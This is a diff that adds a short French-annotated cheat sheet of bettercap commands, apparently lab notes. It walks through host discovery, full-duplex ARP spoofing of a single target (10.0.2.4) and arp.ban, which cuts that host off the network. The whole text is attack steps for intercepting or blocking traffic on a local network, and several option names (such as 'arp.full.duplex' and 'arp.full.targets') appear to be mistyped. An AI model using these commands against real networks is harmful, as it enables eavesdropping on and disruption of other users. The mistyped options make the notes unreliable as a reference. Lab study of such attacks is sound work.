@@ -1,0 +1,30 @@
+
+$ sudo bettercap
+>>> lancement.
+
+» help
+>>> help generique.
+
+» help. net.recon
+>>> help précise.
+
+» net.show
+>>> affiche la table ARP.
+
+» net.recon on
+>>> démarre le host discovery.
+
+» help arp.spoof
+
+» set arp.full.duplex true
+>>> faire du spoofing dans les deux sens.
+
+» set arp.full.targets 10.0.2.4
+>>> faire du spoofing pour l'adresse donnée.
+
+» arp.spoof on
+>>> active le ARP spoofing. 
+
+» arp.ban on
+>> active le ARP spoofing ban.
+
